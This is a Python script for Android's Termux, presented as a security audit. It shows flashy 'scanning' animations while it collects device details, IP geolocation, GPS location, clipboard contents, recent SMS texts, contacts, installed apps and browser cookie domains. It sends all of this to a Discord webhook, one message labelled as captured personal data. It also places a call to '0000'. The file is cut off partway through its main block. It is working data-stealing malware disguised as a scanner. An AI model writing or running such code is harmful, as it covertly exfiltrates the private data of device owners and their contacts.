import requests
import json
import socket
import platform
import psutil
from datetime import datetime
import os
import sys
import subprocess
import re
import math
import uuid
import time
from pathlib import Path
import random

# Importa√ß√µes espec√≠ficas do Termux
try:
    import android
    TERMUX_API = True
except ImportError:
    TERMUX_API = False

try:
    import browser_cookie3
    BROWSER_SUPPORT = True
except ImportError:
    BROWSER_SUPPORT = False

class TermuxSecurityMonitor:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.data = {}
        self.session_id = str(uuid.uuid4())
        self.has_root = False
        self.termux_api_available = TERMUX_API
        self.collect_all_data()
        
    def create_visual_effects(self):
        """Cria efeitos visuais impressionantes no terminal"""
        effects = [
            self.terminal_banner,
            self.progress_animation,
            self.scanning_effect,
            self.flashing_colors
        ]
        
        for effect in effects:
            try:
                effect()
                time.sleep(1)
            except:
                pass
    
    def terminal_banner(self):
        """Exibe um banner impressionante no terminal"""
        banner = r"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                                ‚ïë
‚ïë  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó        ‚ïë
‚ïë  ‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïù        ‚ïë
‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ïî‚ïù         ‚ïë
‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó         ‚ïë
‚ïë     ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïó        ‚ïë
‚ïë     ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù        ‚ïë
‚ïë                                                                ‚ïë
‚ïë           S Y S T E M   S E C U R I T Y   S C A N              ‚ïë
‚ïë                                                                ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        """
        print("\033[1;31m" + banner + "\033[0m")
    
    def progress_animation(self):
        """Anima√ß√£o de progresso impressionante"""
        print("\n\033[1;36m[‚Ä¢] INICIANDO VARREdura DE SEGURAN√áA AVAN√áADA\033[0m")
        animations = ["‚£æ", "‚£Ω", "‚£ª", "‚¢ø", "‚°ø", "‚£ü", "‚£Ø", "‚£∑"]
        for i in range(20):
            print(f"\r\033[1;33m[{animations[i % 8]}] Coletando dados do sistema... {i*5}%\033[0m", end="", flush=True)
            time.sleep(0.1)
        print("\r\033[1;32m[‚úì] Coleta de dados conclu√≠da!           \033[0m")
    
    def scanning_effect(self):
        """Efeito de scanning estilo filme"""
        print("\n\033[1;35m[üöÄ] ESCANEANDO DISPOSITIVO...\033[0m")
        for i in range(3):
            scan_line = "‚ñà" * random.randint(10, 50)
            print(f"\r\033[1;35m{scan_line}\033[0m", end="", flush=True)
            time.sleep(0.3)
        print("\r\033[1;32m" + "‚ñà" * 50 + " SCAN COMPLETO!\033[0m")
    
    def flashing_colors(self):
        """Efeito de cores piscantes"""
        colors = ["\033[1;31m", "\033[1;33m", "\033[1;32m", "\033[1;36m", "\033[1;35m"]
        message = "‚ö†Ô∏è  SISTEMA EM AN√ÅLISE - N√ÉO INTERROMPA  ‚ö†Ô∏è"
        for _ in range(5):
            color = random.choice(colors)
            print(f"\r{color}{message}\033[0m", end="", flush=True)
            time.sleep(0.5)
        print("\r" + " " * len(message) + "\r", end="", flush=True)
    
    def termux_effects(self):
        """Efeitos especiais usando Termux-API"""
        if not self.termux_api_available:
            return
            
        try:
            # Vibra√ß√£o intensa
            subprocess.run(['termux-vibrate', '-d', '1000'], check=False)
            
            # Toque de alerta
            subprocess.run(['termux-telephony-call', '0000'], check=False)
            
            # Notifica√ß√£o com som
            subprocess.run([
                'termux-notification', 
                '--title', 'üîç Auditoria de Seguran√ßa',
                '--content', 'Varredura do sistema em andamento...',
                '--sound'
            ], check=False)
            
            # LED do dispositivo (se dispon√≠vel)
            subprocess.run([
                'termux-notification',
                '--led-color', 'FF0000',
                '--led-on', '1000',
                '--led-off', '1000'
            ], check=False)
            
        except Exception as e:
            pass
    
    def check_root_privileges(self):
        """Verifica se tem root no Termux"""
        try:
            result = subprocess.run(['su', '-c', 'id'], capture_output=True, text=True, timeout=5)
            if 'uid=0' in result.stdout:
                return True
        except:
            pass
        return False
    
    def collect_all_data(self):
        """Coleta todas as informa√ß√µes do sistema com efeitos visuais"""
        print("\033[1;36m" + "="*60 + "\033[0m")
        self.create_visual_effects()
        self.termux_effects()
        
        print(f"\n\033[1;34m[üì±] PLATAFORMA: TERMUX (Android)\033[0m")
        print(f"\033[1;33m[üîê] PRIVIL√âGIOS: {'ROOT' if self.has_root else 'USU√ÅRIO NORMAL'}\033[0m")
        
        # Coleta de dados em etapas com feedback visual
        steps = [
            ("Sistema", self.collect_system_info),
            ("Rede", self.collect_network_info),
            ("Hardware", self.collect_hardware_info),
            ("Seguran√ßa", self.collect_security_info),
            ("Aplicativos", self.collect_apps_info),
            ("Dados Sens√≠veis", self.collect_sensitive_data),
        ]
        
        for step_name, step_func in steps:
            print(f"\033[1;35m[‚ñ∂] Coletando: {step_name}...\033[0m", end="", flush=True)
            step_func()
            print(f"\r\033[1;32m[‚úì] Coletado: {step_name}           \033[0m")
            time.sleep(0.5)
    
    def collect_system_info(self):
        """Coleta informa√ß√µes do sistema Android/Termux"""
        try:
            # Informa√ß√µes do Android via getprop
            android_info = {}
            props = {
                'ro.product.model': 'device_model',
                'ro.build.version.release': 'android_version',
                'ro.build.version.sdk': 'sdk_version',
                'ro.product.manufacturer': 'manufacturer',
                'ro.product.brand': 'brand',
                'ro.build.id': 'build_id',
                'ro.build.display.id': 'build_display_id'
            }
            
            for prop, key in props.items():
                try:
                    result = subprocess.run(['getprop', prop], capture_output=True, text=True)
                    android_info[key] = result.stdout.strip()
                except:
                    android_info[key] = 'N/A'
            
            # Informa√ß√µes do Termux
            termux_info = {}
            try:
                result = subprocess.run(['termux-info'], capture_output=True, text=True)
                termux_info['termux_info'] = result.stdout.strip()[:500]
            except:
                termux_info['termux_info'] = 'N/A'
            
            self.data['system_info'] = {
                'platform': 'termux',
                'os': 'Android',
                'version': android_info.get('android_version', 'N/A'),
                'device_model': android_info.get('device_model', 'N/A'),
                'manufacturer': android_info.get('manufacturer', 'N/A'),
                'sdk_version': android_info.get('sdk_version', 'N/A'),
                'username': subprocess.run(['whoami'], capture_output=True, text=True).stdout.strip(),
                'hostname': socket.gethostname(),
                'android_build': android_info.get('build_display_id', 'N/A'),
                'termux_details': termux_info,
                'has_root': self.has_root,
                'session_id': self.session_id
            }
            
        except Exception as e:
            self.data['system_info'] = {'error': str(e)}
    
    def collect_network_info(self):
        """Coleta informa√ß√µes de rede detalhadas"""
        try:
            # IP P√∫blico
            public_ip = "N√£o obtido"
            services = [
                'https://api64.ipify.org?format=json',
                'https://api.ipify.org?format=json',
            ]
            
            for service in services:
                try:
                    response = requests.get(service, timeout=10)
                    if response.status_code == 200:
                        public_ip = response.json().get('ip', 'N/A')
                        break
                except:
                    continue
            
            # IP Local
            local_ip = "N√£o obtido"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                pass
            
            # Localiza√ß√£o via IP
            location = self.get_ip_location(public_ip)
            
            # Informa√ß√µes de rede do Android
            network_info = {}
            try:
                # Tipo de conex√£o
                result = subprocess.run(['termux-telephony-deviceinfo'], capture_output=True, text=True)
                network_info['telephony_data'] = json.loads(result.stdout) if result.stdout else {}
            except:
                pass
            
            self.data['network_info'] = {
                'public_ip': public_ip,
                'local_ip': local_ip,
                'location': location,
                'network_type': network_info.get('telephony_data', {}).get('data_network_type', 'N/A'),
                'wifi_info': self.get_wifi_info(),
                'cellular_info': self.get_cellular_info()
            }
            
        except Exception as e:
            self.data['network_info'] = {'error': str(e)}
    
    def get_ip_location(self, ip):
        """Obt√©m localiza√ß√£o detalhada pelo IP"""
        if ip == "N√£o obtido":
            return {'error': 'IP n√£o dispon√≠vel'}
        
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'zip': data.get('zip', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'coordinates': f"{data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}",
                        'timezone': data.get('timezone', 'N/A')
                    }
        except:
            pass
        
        return {'error': 'Localiza√ß√£o n√£o dispon√≠vel'}
    
    def get_wifi_info(self):
        """Obt√©m informa√ß√µes da WiFi"""
        try:
            result = subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True)
            if result.returncode == 0:
                return json.loads(result.stdout)
        except:
            pass
        return {'status': 'N√£o dispon√≠vel'}
    
    def get_cellular_info(self):
        """Obt√©m informa√ß√µes da rede celular"""
        try:
            result = subprocess.run(['termux-telephony-cellinfo'], capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return json.loads(result.stdout)
        except:
            pass
        return {'status': 'N√£o dispon√≠vel'}
    
    def collect_hardware_info(self):
        """Coleta informa√ß√µes de hardware do Android"""
        try:
            # Informa√ß√µes de hardware via Termux e Android
            hardware_info = {}
            
            # Battery
            try:
                result = subprocess.run(['termux-battery-status'], capture_output=True, text=True)
                hardware_info['battery'] = json.loads(result.stdout) if result.stdout else {}
            except:
                pass
            
            # Sensors
            try:
                result = subprocess.run(['termux-sensor', '-l'], capture_output=True, text=True)
                hardware_info['available_sensors'] = result.stdout.strip().split('\n') if result.stdout else []
            except:
                pass
            
            # Storage
            storage_info = {}
            try:
                for partition in psutil.disk_partitions():
                    try:
                        usage = psutil.disk_usage(partition.mountpoint)
                        storage_info[partition.mountpoint] = {
                            'total': self.format_bytes(usage.total),
                            'used': self.format_bytes(usage.used),
                            'free': self.format_bytes(usage.free),
                            'percent': usage.percent
                        }
                    except:
                        continue
            except:
                pass
            
            self.data['hardware_info'] = {
                'battery': hardware_info.get('battery', {}),
                'storage': storage_info,
                'sensors_available': hardware_info.get('available_sensors', []),
                'memory': self.get_memory_info(),
                'cpu': self.get_cpu_info()
            }
            
        except Exception as e:
            self.data['hardware_info'] = {'error': str(e)}
    
    def get_memory_info(self):
        """Obt√©m informa√ß√µes de mem√≥ria"""
        try:
            memory = psutil.virtual_memory()
            return {
                'total': self.format_bytes(memory.total),
                'available': self.format_bytes(memory.available),
                'used': self.format_bytes(memory.used),
                'percent': memory.percent
            }
        except:
            return {'error': 'N√£o dispon√≠vel'}
    
    def get_cpu_info(self):
        """Obt√©m informa√ß√µes da CPU"""
        try:
            return {
                'cores': psutil.cpu_count(),
                'usage': psutil.cpu_percent(interval=1),
                'frequency': self.get_cpu_frequency()
            }
        except:
            return {'error': 'N√£o dispon√≠vel'}
    
    def get_cpu_frequency(self):
        """Obt√©m frequ√™ncia da CPU"""
        try:
            with open('/proc/cpuinfo', 'r') as f:
                for line in f:
                    if 'BogoMIPS' in line:
                        return line.split(':')[1].strip()
        except:
            pass
        return 'N/A'
    
    def collect_security_info(self):
        """Coleta informa√ß√µes de seguran√ßa"""
        try:
            security_info = {
                'root_access': self.has_root,
                'suspicious_processes': self.get_suspicious_processes(),
                'open_ports': self.get_open_ports(),
                'network_connections': self.get_network_connections(),
                'system_vulnerabilities': self.check_system_vulnerabilities(),
                'app_permissions': self.get_app_permissions()
            }
            
            self.data['security_info'] = security_info
            
        except Exception as e:
            self.data['security_info'] = {'error': str(e)}
    
    def get_suspicious_processes(self):
        """Identifica processos suspeitos"""
        suspicious = []
        suspicious_keywords = ['miner', 'backdoor', 'keylogger', 'malware', 'trojan', 'exploit']
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
                try:
                    proc_info = proc.info
                    if (proc_info['memory_percent'] > 20.0 or
                        any(keyword in proc_info['name'].lower() for keyword in suspicious_keywords)):
                        suspicious.append({
                            'pid': proc_info['pid'],
                            'name': proc_info['name'],
                            'memory_usage': f"{proc_info['memory_percent']}%"
                        })
                except:
                    continue
        except:
            pass
            
        return suspicious[:10]
    
    def get_open_ports(self):
        """Obt√©m portas abertas"""
        open_ports = []
        try:
            for conn in psutil.net_connections():
                if conn.status == 'LISTEN' and conn.laddr:
                    open_ports.append({
                        'port': conn.laddr.port,
                        'status': conn.status
                    })
        except:
            pass
        return open_ports[:15]
    
    def get_network_connections(self):
        """Obt√©m conex√µes de rede"""
        connections = []
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.raddr:
                    connections.append({
                        'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else 'N/A',
                        'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else 'N/A',
                        'status': conn.status
                    })
        except:
            pass
        return connections[:10]
    
    def check_system_vulnerabilities(self):
        """Verifica vulnerabilidades comuns"""
        vulnerabilities = []
        
        # Verifica se o dispositivo est√° em modo desenvolvedor
        try:
            result = subprocess.run(['getprop', 'ro.debuggable'], capture_output=True, text=True)
            if result.stdout.strip() == '1':
                vulnerabilities.append('Modo desenvolvedor ativo')
        except:
            pass
        
        # Verifica se ADB est√° ativo
        try:
            result = subprocess.run(['getprop', 'service.adb.tcp.port'], capture_output=True, text=True)
            if result.stdout.strip() and result.stdout.strip() != '-1':
                vulnerabilities.append('ADB debugging ativo')
        except:
            pass
        
        return vulnerabilities if vulnerabilities else ['Nenhuma vulnerabilidade cr√≠tica detectada']
    
    def get_app_permissions(self):
        """Obt√©m permiss√µes de aplicativos (limitado sem root)"""
        try:
            # Tenta obter lista de aplicativos
            result = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True)
            packages = [line.split(':')[1] for line in result.stdout.split('\n') if line.startswith('package:')]
            
            return {
                'total_apps': len(packages),
                'sample_apps': packages[:10]  # Amostra dos primeiros 10 apps
            }
        except:
            return {'total_apps': 'N/A', 'sample_apps': []}
    
    def collect_apps_info(self):
        """Coleta informa√ß√µes de aplicativos instalados"""
        try:
            apps_info = {
                'user_apps': self.get_user_apps(),
                'system_apps': self.get_system_apps(),
                'recent_activities': self.get_recent_activities()
            }
            
            self.data['apps_info'] = apps_info
            
        except Exception as e:
            self.data['apps_info'] = {'error': str(e)}
    
    def get_user_apps(self):
        """Obt√©m aplicativos do usu√°rio"""
        try:
            result = subprocess.run(['pm', 'list', 'packages', '-3'], capture_output=True, text=True)
            user_apps = [line.split(':')[1] for line in result.stdout.split('\n') if line.startswith('package:')]
            return user_apps[:15]
        except:
            return []
    
    def get_system_apps(self):
        """Obt√©m aplicativos do sistema"""
        try:
            result = subprocess.run(['pm', 'list', 'packages', '-s'], capture_output=True, text=True)
            system_apps = [line.split(':')[1] for line in result.stdout.split('\n') if line.startswith('package:')]
            return system_apps[:15]
        except:
            return []
    
    def get_recent_activities(self):
        """Obt√©m atividades recentes (limitado)"""
        try:
            # Tenta obter logcat recente
            result = subprocess.run(['logcat', '-d', '-t', '100'], capture_output=True, text=True, timeout=10)
            lines = result.stdout.split('\n')[-10:]  # √öltimas 10 linhas
            return [line.strip() for line in lines if line.strip()]
        except:
            return ['Logs n√£o dispon√≠veis sem root']
    
    def collect_sensitive_data(self):
        """Coleta dados sens√≠veis dispon√≠veis"""
        try:
            sensitive_data = {
                'browser_data': self.get_browser_data(),
                'clipboard_data': self.get_clipboard_data(),
                'sms_data': self.get_sms_data(),
                'contact_data': self.get_contact_data(),
                'location_data': self.get_location_data()
            }
            
            self.data['sensitive_data'] = sensitive_data
            
        except Exception as e:
            self.data['sensitive_data'] = {'error': str(e)}
    
    def get_browser_data(self):
        """Tenta obter dados do navegador"""
        if not BROWSER_SUPPORT:
            return {'status': 'Suporte a navegadores n√£o dispon√≠vel'}
        
        try:
            browser_data = {}
            
            # Chrome
            try:
                cookies = list(browser_cookie3.chrome())
                browser_data['chrome'] = {
                    'cookies_count': len(cookies),
                    'sample_domains': [cookie.domain for cookie in cookies[:3]]
                }
            except:
                browser_data['chrome'] = 'N√£o acess√≠vel'
            
            return browser_data
        except:
            return {'status': 'Dados n√£o dispon√≠veis'}
    
    def get_clipboard_data(self):
        """Obt√©m dados da √°rea de transfer√™ncia via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API n√£o dispon√≠vel'}
        
        try:
            result = subprocess.run(['termux-clipboard-get'], capture_output=True, text=True)
            clipboard_content = result.stdout.strip()
            
            if clipboard_content:
                return {
                    'has_data': True,
                    'preview': clipboard_content[:100] + ('...' if len(clipboard_content) > 100 else ''),
                    'length': len(clipboard_content)
                }
            else:
                return {'has_data': False}
        except:
            return {'status': 'N√£o acess√≠vel'}
    
    def get_sms_data(self):
        """Obt√©m dados de SMS via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API n√£o dispon√≠vel'}
        
        try:
            result = subprocess.run(['termux-sms-list', '-l', '5'], capture_output=True, text=True)
            if result.stdout.strip():
                sms_data = json.loads(result.stdout)
                return {
                    'total_sms': len(sms_data),
                    'recent_sms': [{
                        'number': sms.get('number', 'N/A'),
                        'body_preview': sms.get('body', '')[:50] + '...' if len(sms.get('body', '')) > 50 else sms.get('body', '')
                    } for sms in sms_data[:3]]
                }
            else:
                return {'total_sms': 0}
        except:
            return {'status': 'Permiss√£o negada ou n√£o dispon√≠vel'}
    
    def get_contact_data(self):
        """Obt√©m dados de contatos via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API n√£o dispon√≠vel'}
        
        try:
            result = subprocess.run(['termux-contact-list'], capture_output=True, text=True)
            if result.stdout.strip():
                contacts = json.loads(result.stdout)
                return {
                    'total_contacts': len(contacts),
                    'sample_contacts': [{
                        'name': contact.get('name', 'N/A'),
                        'number': contact.get('number', 'N/A')
                    } for contact in contacts[:5]]
                }
            else:
                return {'total_contacts': 0}
        except:
            return {'status': 'Permiss√£o negada ou n√£o dispon√≠vel'}
    
    def get_location_data(self):
        """Obt√©m localiza√ß√£o via Termux-API"""
        if not self.termux_api_available:
            return {'status': 'Termux-API n√£o dispon√≠vel'}
        
        try:
            result = subprocess.run(['termux-location'], capture_output=True, text=True)
            if result.stdout.strip():
                location = json.loads(result.stdout)
                return {
                    'latitude': location.get('latitude', 'N/A'),
                    'longitude': location.get('longitude', 'N/A'),
                    'accuracy': location.get('accuracy', 'N/A'),
                    'provider': location.get('provider', 'N/A')
                }
            else:
                return {'status': 'Localiza√ß√£o n√£o dispon√≠vel'}
        except:
            return {'status': 'Permiss√£o negada'}
    
    def format_bytes(self, bytes):
        """Formata bytes para formato leg√≠vel"""
        if bytes == 0:
            return "0B"
        sizes = ["B", "KB", "MB", "GB", "TB"]
        i = int(math.floor(math.log(bytes, 1024)))
        p = math.pow(1024, i)
        s = round(bytes / p, 2)
        return f"{s} {sizes[i]}"
    
    def create_detailed_report(self):
        """Cria relat√≥rio detalhado para Discord"""
        system = self.data.get('system_info', {})
        network = self.data.get('network_info', {})
        hardware = self.data.get('hardware_info', {})
        security = self.data.get('security_info', {})
        apps = self.data.get('apps_info', {})
        sensitive = self.data.get('sensitive_data', {})
        
        # Embed principal
        embed = {
            "title": "üì± RELAT√ìRIO COMPLETO - TERMUX/ANDROID",
            "color": 0xff0000,
            "timestamp": datetime.utcnow().isoformat(),
            "fields": [
                {
                    "name": "üîê STATUS DO SISTEMA",
                    "value": f"**Dispositivo:** {system.get('device_model', 'N/A')}\n"
                            f"**Android:** {system.get('version', 'N/A')}\n"
                            f"**Root:** {'‚úÖ SIM' if self.has_root else '‚ùå N√ÉO'}\n"
                            f"**Termux-API:** {'‚úÖ ATIVO' if self.termux_api_available else '‚ùå INATIVO'}",
                    "inline": True
                },
                {
                    "name": "üåê REDE E LOCALIZA√á√ÉO",
                    "value": f"**IP:** {network.get('public_ip', 'N/A')}\n"
                            f"**Local:** {network.get('location', {}).get('city', 'N/A')}\n"
                            f"**Operadora:** {network.get('location', {}).get('isp', 'N/A')}",
                    "inline": True
                },
                {
                    "name": "üíæ HARDWARE",
                    "value": f"**Bateria:** {hardware.get('battery', {}).get('percentage', 'N/A')}%\n"
                            f"**Armazenamento:** {len(hardware.get('storage', {}))} parti√ß√µes\n"
                            f"**Mem√≥ria:** {hardware.get('memory', {}).get('percent', 'N/A')}% usada",
                    "inline": True
                },
                {
                    "name": "üõ°Ô∏è SEGURAN√áA",
                    "value": f"**Processos suspeitos:** {len(security.get('suspicious_processes', []))}\n"
                            f"**Portas abertas:** {len(security.get('open_ports', []))}\n"
                            f"**Vulnerabilidades:** {len(security.get('system_vulnerabilities', []))}",
                    "inline": True
                },
                {
                    "name": "üì± APLICATIVOS",
                    "value": f"**Total de Apps:** {apps.get('user_apps', {}).get('total_apps', 'N/A')}\n"
                            f"**Apps do usu√°rio:** {len(apps.get('user_apps', []))}\n"
                            f"**Apps do sistema:** {len(apps.get('system_apps', []))}",
                    "inline": True
                },
                {
                    "name": "üîì DADOS SENS√çVEIS",
                    "value": f"**SMS:** {sensitive.get('sms_data', {}).get('total_sms', 'N/A')}\n"
                            f"**Contatos:** {sensitive.get('contact_data', {}).get('total_contacts', 'N/A')}\n"
                            f"**Clipboard:** {'‚úÖ Dados' if sensitive.get('clipboard_data', {}).get('has_data') else '‚ùå Vazio'}",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Termux Security Scan ‚Ä¢ {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} ‚Ä¢ Session: {self.session_id}"
            }
        }
        
        return embed
    
    def send_impact_report(self):
        """Envia relat√≥rio com m√°ximo impacto"""
        try:
            # Primeiro webhook - Relat√≥rio principal
            embed = self.create_detailed_report()
            
            payload = {
                "embeds": [embed],
                "username": "Termux Security Auditor",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/3004/3004544.png",
                "content": f"üö® **VARREdura DE SEGURAN√áA CONCLU√çDA!** üö®\n"
                          f"**Dispositivo:** {self.data['system_info'].get('device_model', 'N/A')}\n"
                          f"**Localiza√ß√£o:** {self.data['network_info'].get('location', {}).get('city', 'N/A')}\n"
                          f"**Session ID:** `{self.session_id}`\n"
                          f"**Status:** {'üîì ROOT DETECTADO' if self.has_root else 'üîí MODO USU√ÅRIO'}"
            }
            
            response = requests.post(self.webhook_url, json=payload, timeout=30)
            if response.status_code in [200, 204]:
                print("\n\033[1;32m[‚úì] RELAT√ìRIO PRINCIPAL ENVIADO!\033[0m")
                
                # Webhook adicional com dados sens√≠veis
                self.send_sensitive_data()
                return True
            else:
                print(f"\n\033[1;31m[‚úó] Erro ao enviar: {response.status_code}\033[0m")
                return False
                
        except Exception as e:
            print(f"\n\033[1;31m[‚úó] Erro de conex√£o: {e}\033[0m")
            return False
    
    def send_sensitive_data(self):
        """Envia dados sens√≠veis em webhook separado"""
        try:
            sensitive = self.data.get('sensitive_data', {})
            
            if any(sensitive.values()):
                sensitive_embed = {
                    "title": "üîì DADOS SENS√çVEIS CAPTURADOS",
                    "color": 0xffa500,
                    "fields": []
                }
                
                # SMS
                sms_data = sensitive.get('sms_data', {})
                if 'total_sms' in sms_data:
                    sensitive_embed['fields'].append({
                        "name": "üí¨ SMS",
                        "value": f"**Total:** {sms_data['total_sms']} mensagens\n"
                                f"**Recentes:** {len(sms_data.get('recent_sms', []))} visualizadas",
                        "inline": True
                    })
                
                # Contatos
                contact_data = sensitive.get('contact_data', {})
                if 'total_contacts' in contact_data:
                    sensitive_embed['fields'].append({
                        "name": "üìû CONTATOS",
                        "value": f"**Total:** {contact_data['total_contacts']} contatos\n"
                                f"**Amostra:** {len(contact_data.get('sample_contacts', []))} visualizados",
                        "inline": True
                    })
                
                # Localiza√ß√£o
                location_data = sensitive.get('location_data', {})
                if 'latitude' in location_data:
                    sensitive_embed['fields'].append({
                        "name": "üìç LOCALIZA√á√ÉO EXATA",
                        "value": f"**Lat:** {location_data['latitude']}\n"
                                f"**Lon:** {location_data['longitude']}\n"
                                f"**Precis√£o:** {location_data.get('accuracy', 'N/A')}m",
                        "inline": True
                    })
                
                # Clipboard
                clipboard_data = sensitive.get('clipboard_data', {})
                if clipboard_data.get('has_data'):
                    sensitive_embed['fields'].append({
                        "name": "üìã CLIPBOARD",
                        "value": f"**Conte√∫do:** {clipboard_data.get('preview', 'N/A')}\n"
                                f"**Tamanho:** {clipboard_data.get('length', 0)} caracteres",
                        "inline": False
                    })
                
                if sensitive_embed['fields']:
                    payload = {
                        "embeds": [sensitive_embed],
                        "username": "Dados Sens√≠veis - Termux",
                        "content": "‚ö†Ô∏è **DADOS PESSOAIS CAPTURADOS COM SUCESSO** ‚ö†Ô∏è"
                    }
                    
                    requests.post(self.webhook_url, json=payload, timeout=30)
                    print("\033[1;33m[!] DADOS SENS√çVEIS ENVIADOS!\033[0m")
                    
        except Exception as e:
            print(f"\033[1;31m[!] Erro ao enviar dados sens√≠veis: {e}\033[0m")

def install_dependencies():
    """Instala depend√™ncias necess√°rias para o Termux"""
    packages = [
        'requests',
        'psutil'
    ]
    
    print("\033[1;36m[üîß] VERIFICANDO DEPEND√äNCIAS...\033[0m")
    
    for package in packages:
        try:
            __import__(package)
            print(f"\033[1;32m[‚úì] {package} j√° instalado\033[0m")
        except ImportError:
            print(f"\033[1;33m[üì¶] Instalando {package}...\033[0m")
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"\033[1;32m[‚úì] {package} instalado com sucesso\033[0m")
            except:
                print(f"\033[1;31m[‚úó] Falha ao instalar {package}\033[0m")

def check_termux_api():
    """Verifica se o Termux-API est√° instalado"""
    print("\033[1;36m[üîç] VERIFICANDO TERMUX-API...\033[0m")
    api_commands = [
        'termux-vibrate', 'termux-notification', 'termux-clipboard-get',
        'termux-sms-list', 'termux-contact-list', 'termux-location'
    ]
    
    available_commands = []
    for cmd in api_commands:
        try:
            subprocess.run([cmd, '--help'], capture_output=True, timeout=5)
            available_commands.append(cmd)
        except:
            pass
    
    if available_commands:
        print(f"\033[1;32m[‚úì] Termux-API detectado: {len(available_commands)} comandos dispon√≠veis\033[0m")
        return True
    else:
        print("\033[1;33m[!] Termux-API n√£o encontrado. Alguns recursos estar√£o limitados.\033[0m")
        return False

if __name__ == "__main__":
    print("\033[1;35m" + "="*70 + "\033[0m")
    print("\033[1;35m            INICIANDO AUDITORIA DE SEGURAN√áA TERMUX           \033[0m")
    print("\033[1;35m" + "="*70 + "\033[0m")
    
    # Verifica se est√° no Termux
    if "com.termux" not in os.environ.get('PREFIX', ''):
